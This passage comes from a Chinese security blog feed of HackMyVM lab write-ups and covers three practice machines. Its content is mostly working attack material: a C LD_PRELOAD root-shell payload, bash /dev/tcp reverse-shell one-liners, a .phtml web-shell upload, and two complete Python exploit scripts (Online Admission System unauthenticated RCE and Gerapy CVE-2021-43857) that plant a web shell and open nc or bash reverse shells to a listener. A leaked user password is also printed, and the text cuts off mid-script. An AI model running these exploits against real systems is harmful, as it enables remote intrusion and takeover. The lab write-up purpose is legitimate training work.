title="user.txt"></a>user.txt</h2><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331151836252.png" alt="image-20220331151836252"></p><h2 id="root-txt"><a href="#root-txt" class="headerlink" title="root.txt"></a>root.txt</h2><p>不多解释，一把嗦</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331151956976.png" alt="image-20220331151956976"></p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331152020955.png" alt="image-20220331152020955"></p><h2 id="机器预设提权"><a href="#机器预设提权" class="headerlink" title="机器预设提权"></a>机器预设提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331152119919.png" alt="image-20220331152119919"></p><h3 id="LD-PRELOAD提权"><a href="#LD-PRELOAD提权" class="headerlink" title="LD_PRELOAD提权"></a>LD_PRELOAD提权</h3><p>LD_PRELOAD是Linux下的一个环境变量，程序运行时都会加载一些so文件，类似于windows下程序加载dll，而LD_PRELOAD可以指定程序运行前加载的动态连接库。</p><p>exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o exp.so exp.c -nostartfiles</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo LD_PRELOAD=/tmp/exp.so <span class="built_in">cat</span></span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331153021084.png" alt="image-20220331153021084"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Hackmyvm Machines </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackmyvm - Comingsoon WriteUp</title>
      <link href="/posts/48584345/"/>
      <url>/posts/48584345/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><p><strong>Machines Name：</strong>Hackmyvm - Comingsoon</p><p><strong>Difficulty：</strong>easy</p><p><img src="https://hackmyvm.eu/img/m/machine.gif"></p><p>nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -sS -vv -Pn 192.168.56.13 </span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331134752951.png" alt="image-20220331134752951"></p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331135038292.png" alt="image-20220331135038292"></p><p>目录扫描无果</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331135110783.png" alt="image-20220331135110783"></p><h2 id="cookie伪造"><a href="#cookie伪造" class="headerlink" title="cookie伪造"></a>cookie伪造</h2><p>burp抓包分析，发现cookie有点奇怪</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331135236267.png" alt="image-20220331135236267"></p><p>base64解码</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331135412963.png" alt="image-20220331135412963"></p><p>好像是一个启用upload的一个功能，构造cookie发包</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331135531973.png" alt="image-20220331135531973"></p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331135643271.png" alt="image-20220331135643271"></p><h2 id="phtml文件上传getshell"><a href="#phtml文件上传getshell" class="headerlink" title="phtml文件上传getshell"></a>phtml文件上传getshell</h2><p>首页多出一个upload按钮</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331135700007.png" alt="image-20220331135700007"></p><p>点击UPLOAD跳转到上传文件页面</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331135822682.png" alt="image-20220331135822682"></p><p>上传.php后缀提示不允许上传</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331135935113.png" alt="image-20220331135935113"></p><p>.phtml后缀成功上传,并返回路径&#x2F;assets&#x2F;img</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331140237262.png" alt="image-20220331140237262"></p><p>冰蝎连接</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331140720932.png" alt="image-20220331140720932"></p><h2 id="Reverse-shell"><a href="#Reverse-shell" class="headerlink" title="Reverse shell"></a>Reverse shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.56.8/9999 &lt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331141033749.png" alt="image-20220331141033749"></p><h2 id="user-txt"><a href="#user-txt" class="headerlink" title="user.txt"></a>user.txt</h2><p>提权工具一把嗦</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331141340364.png" alt="image-20220331141340364"></p><h2 id="root-txt"><a href="#root-txt" class="headerlink" title="root.txt"></a>root.txt</h2><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331141411332.png" alt="image-20220331141411332"></p><h2 id="机器预设方法提权"><a href="#机器预设方法提权" class="headerlink" title="机器预设方法提权"></a>机器预设方法提权</h2><p>有点难搞，不做演示，有摩托车还要什么自行车！</p>]]></content>
      
      
      
        <tags>
            
            <tag> Hackmyvm Machines </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackmyvm - University WriteUp</title>
      <link href="/posts/877236973/"/>
      <url>/posts/877236973/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><p><strong>Machines Name：</strong>Hackmyvm - university</p><p><strong>Difficulty：</strong>easy</p><p><img src="https://hackmyvm.eu/img/m/machine.gif"></p><p>nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -sS -vv -A -Pn 192.168.56.9</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220329164144783.png" alt="image-20220329164144783"></p><p>其实到这我就已经知道这个机器要干嘛了，nmap扫到了.git泄露，得到这个系统为</p><p><a href="https://github.com/rskoolrash/Online-Admission-System">https://github.com/rskoolrash/Online-Admission-System</a></p><p>那么google一下这个系统相关</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220329165107459.png" alt="image-20220329165107459"></p><p>没什么很大难度，80上是一个登录页面，试了几个弱口令均不行。</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220329165220991.png" alt="image-20220329165220991"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Online Admission System 1.0 - Remote Code Execution (RCE) (Unauthenticated)</span></span><br><span class="line"><span class="comment"># Date: 23/12/2021</span></span><br><span class="line"><span class="comment"># Exploit Author: Jeremiasz Pluta</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://github.com/rskoolrash/Online-Admission-System</span></span><br><span class="line"><span class="comment"># Software Link: https://github.com/rskoolrash/Online-Admission-System</span></span><br><span class="line"><span class="comment"># Tested on: LAMP Stack (Debian 10)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Exploit for Online Admission System 1.0 - Remote Code Execution (Unauthenticated)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">path = <span class="string">&#x27;/&#x27;</span> <span class="comment">#change me if the path to the /oas is in the root directory or another subdir</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, target_ip, target_port, localhost, localport</span>):</span><br><span class="line">self.target_ip = target_ip</span><br><span class="line">self.target_port = target_port</span><br><span class="line">self.localhost = localhost</span><br><span class="line">self.localport = localport</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploitation</span>(<span class="params">self</span>):</span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;&quot;&quot;</span></span><br><span class="line">payload2 = <span class="string">&quot;&quot;&quot;rm+/tmp/f%3bmknod+/tmp/f+p%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+&quot;&quot;&quot;</span> + localhost + <span class="string">&quot;&quot;&quot;+&quot;&quot;&quot;</span> + localport + <span class="string">&quot;&quot;&quot;+&gt;/tmp/f&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://&#x27;</span> + target_ip + <span class="string">&#x27;:&#x27;</span> + target_port + path</span><br><span class="line">r = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*] Resolving URL...&#x27;</span>)</span><br><span class="line">r1 = r.get(url + <span class="string">&#x27;documents.php&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Upload the payload file</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*] Uploading the webshell payload...&#x27;</span>)</span><br><span class="line">files = &#123;</span><br><span class="line"><span class="string">&#x27;fpic&#x27;</span>: (<span class="string">&#x27;cmd.php&#x27;</span>, payload + <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;application/x-php&#x27;</span>),</span><br><span class="line"><span class="string">&#x27;ftndoc&#x27;</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;application/octet-stream&#x27;</span>),</span><br><span class="line"><span class="string">&#x27;ftcdoc&#x27;</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;application/octet-stream&#x27;</span>),</span><br><span class="line"><span class="string">&#x27;fdmdoc&#x27;</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;application/octet-stream&#x27;</span>),</span><br><span class="line"><span class="string">&#x27;ftcdoc&#x27;</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;application/octet-stream&#x27;</span>),</span><br><span class="line"><span class="string">&#x27;fdcdoc&#x27;</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;application/octet-stream&#x27;</span>),</span><br><span class="line"><span class="string">&#x27;fide&#x27;</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;application/octet-stream&#x27;</span>),</span><br><span class="line"><span class="string">&#x27;fsig&#x27;</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;application/octet-stream&#x27;</span>),</span><br><span class="line">&#125;</span><br><span class="line">data = &#123;<span class="string">&#x27;fpicup&#x27;</span>:<span class="string">&#x27;Submit Query&#x27;</span>&#125;</span><br><span class="line">r2 = r.post(url + <span class="string">&#x27;documents.php&#x27;</span>, files=files, allow_redirects=<span class="literal">True</span>, data=data)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*] Setting up netcat listener...&#x27;</span>)</span><br><span class="line">listener = subprocess.Popen([<span class="string">&quot;nc&quot;</span>, <span class="string">&quot;-nvlp&quot;</span>, self.localport])</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*] Spawning reverse shell...&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*] Watchout!&#x27;</span>)</span><br><span class="line">r3 = r.get(url + <span class="string">&#x27;/studentpic/cmd.php?cmd=&#x27;</span> + payload2)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (r3.status_code == <span class="number">200</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*] Got shell!&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">listener.wait()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[-] Something went wrong!&#x27;</span>)</span><br><span class="line">listener.terminate()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_args</span>():</span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;Online Admission System 1.0 - Remote Code Execution (RCE) (Unauthenticated)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--target&#x27;</span>, dest=<span class="string">&quot;url&quot;</span>, required=<span class="literal">True</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Target IP&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, dest=<span class="string">&quot;target_port&quot;</span>, required=<span class="literal">True</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Target port&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;--listener-ip&#x27;</span>, dest=<span class="string">&quot;localhost&quot;</span>, required=<span class="literal">True</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Local listening IP&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-P&#x27;</span>, <span class="string">&#x27;--localport&#x27;</span>, dest=<span class="string">&quot;localport&quot;</span>, required=<span class="literal">True</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Local listening port&#x27;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"><span class="keyword">return</span> args</span><br><span class="line"></span><br><span class="line">args = get_args()</span><br><span class="line">target_ip = args.url</span><br><span class="line">target_port = args.target_port</span><br><span class="line">localhost = args.localhost</span><br><span class="line">localport = args.localport</span><br><span class="line"></span><br><span class="line">exp = Exploit(target_ip, target_port, localhost, localport)</span><br><span class="line">exp.exploitation()</span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py -t 192.168.56.9 -p 80 -L 192.168.56.8 -P 9999</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220329165406994.png" alt="image-20220329165406994"></p><p>shell反弹出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.56.8/9999 &lt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure><p>获得tty交互会话</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220329170047675.png" alt="image-20220329170047675"></p><p>var&#x2F;www&#x2F;html目录下有用户sandra的密码</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220329171813123.png" alt="image-20220329171813123"></p><h2 id="user-txt"><a href="#user-txt" class="headerlink" title="user.txt"></a>user.txt</h2><p>使用sandra&#x2F;Myyogaiseasy切换到sandra用户</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220329171839034.png" alt="image-20220329171839034"></p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220329171931911.png" alt="image-20220329171931911"></p><h2 id="root-txt"><a href="#root-txt" class="headerlink" title="root.txt"></a>root.txt</h2><p>sudo -l 发现gerapy可以调用root权限且不需要认证</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220329172056578.png" alt="image-20220329172056578"></p><p>参考<a href="https://github.com/Gerapy/Gerapy">https://github.com/Gerapy/Gerapy</a>   初始化gerapy</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220329174136160.png" alt="image-20220329174136160"></p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220329174458519.png" alt="image-20220329174458519"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Gerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated)</span></span><br><span class="line"><span class="comment"># Date: 03/01/2022</span></span><br><span class="line"><span class="comment"># Exploit Author: Jeremiasz Pluta</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://github.com/Gerapy/Gerapy</span></span><br><span class="line"><span class="comment"># Version: All versions of Gerapy prior to 0.9.8</span></span><br><span class="line"><span class="comment"># CVE: CVE-2021-43857</span></span><br><span class="line"><span class="comment"># Tested on: Gerapy 0.9.6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Vulnerability: Gerapy prior to version 0.9.8 is vulnerable to remote code execution. This issue is patched in version 0.9.8.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> pyfiglet</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">banner = pyfiglet.figlet_format(<span class="string">&quot;CVE-2021-43857&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(banner)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Exploit for CVE-2021-43857&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;For: Gerapy &lt; 0.9.8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">login = <span class="string">&quot;lin&quot;</span> <span class="comment">#CHANGE ME IF NEEDED</span></span><br><span class="line">password = <span class="string">&quot;123456&quot;</span> <span class="comment">#CHANGE ME IF NEEDED</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, target_ip, target_port, localhost, localport</span>):</span><br><span class="line">self.target_ip = target_ip</span><br><span class="line">self.target_port = target_port</span><br><span class="line">self.localhost = localhost</span><br><span class="line">self.localport = localport</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploitation</span>(<span class="params">self</span>):</span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&#123;&quot;spider&quot;:&quot;`/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&quot;&quot;&quot;</span> + localhost + <span class="string">&quot;&quot;&quot;/&quot;&quot;&quot;</span> + localport + <span class="string">&quot;&quot;&quot; 0&gt;&amp;1&#x27;`&quot;&#125;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Login to the app (getting auth token)</span></span><br><span class="line">url = <span class="string">&quot;http://&quot;</span> + target_ip + <span class="string">&quot;:&quot;</span> + target_port</span><br><span class="line">r = requests.Session()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Resolving URL...&quot;</span>)</span><br><span class="line">r1 = r.get(url)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Logging in to application...&quot;</span>)</span><br><span class="line">r2 = r.post(url + <span class="string">&quot;/api/user/auth&quot;</span>, json=&#123;<span class="string">&quot;username&quot;</span>:login,<span class="string">&quot;password&quot;</span>:password&#125;, allow_redirects=<span class="literal">True</span>)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">if</span> (r2.status_code == <span class="number">200</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*] Login successful! Proceeding...&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*] Something went wrong!&#x27;</span>)</span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line"><span class="comment">#Create a header out of auth token (yep, it&#x27;s bad as it looks)</span></span><br><span class="line"><span class="built_in">dict</span> = json.loads(r2.text)</span><br><span class="line">temp_token = <span class="string">&#x27;Token &#x27;</span></span><br><span class="line">temp_token2 = json.dumps(<span class="built_in">dict</span>[<span class="string">&#x27;token&#x27;</span>]).strip(<span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">auth_token = &#123;&#125;</span><br><span class="line">auth_token[<span class="string">&#x27;Authorization&#x27;</span>] = temp_token + temp_token2</span><br><span class="line"></span><br><span class="line"><span class="comment">#Get the project list</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Getting the project list&quot;</span>)</span><br><span class="line">r3 = r.get(url + <span class="string">&quot;/api/project/index&quot;</span>, headers=auth_token, allow_redirects=<span class="literal">True</span>)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (r3.status_code != <span class="number">200</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[!] Something went wrong! Maybe the token is corrupted?&quot;</span>)</span><br><span class="line">quit();</span><br><span class="line"></span><br><span class="line"><span class="comment">#Parse the project name for a request (yep, it&#x27;s worse than earlier)</span></span><br><span class="line"><span class="built_in">dict</span> = r3.text <span class="comment"># [&#123;&#x27;name&#x27;: &#x27;test&#x27;&#125;]</span></span><br><span class="line">dict2 = json.dumps(<span class="built_in">dict</span>)</span><br><span class="line">dict3 = json.loads(dict2)</span><br><span class="line">dict3 = json.loads(dict3)</span><br><span class="line">name = dict3[<span class="number">0</span>][<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Found project: &quot;</span> + name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#use the id to check the project</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Getting the ID of the project to build the URL&quot;</span>)</span><br><span class="line">r4 = r.get(url + <span class="string">&quot;/api/project/&quot;</span> + name + <span class="string">&quot;/build&quot;</span>, headers=auth_token, allow_redirects=<span class="literal">True</span>)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">if</span> (r4.status_code != <span class="number">200</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Something went wrong! I can&#x27;t reach the found project!&quot;</span>)</span><br><span class="line">quit();</span><br><span class="line"></span><br><span class="line"><span class="comment">#format the json to dict</span></span><br><span class="line"><span class="built_in">dict</span> = r4.text</span><br><span class="line">dict2 = json.dumps(<span class="built_in">dict</span>)</span><br><span class="line">dict3 = 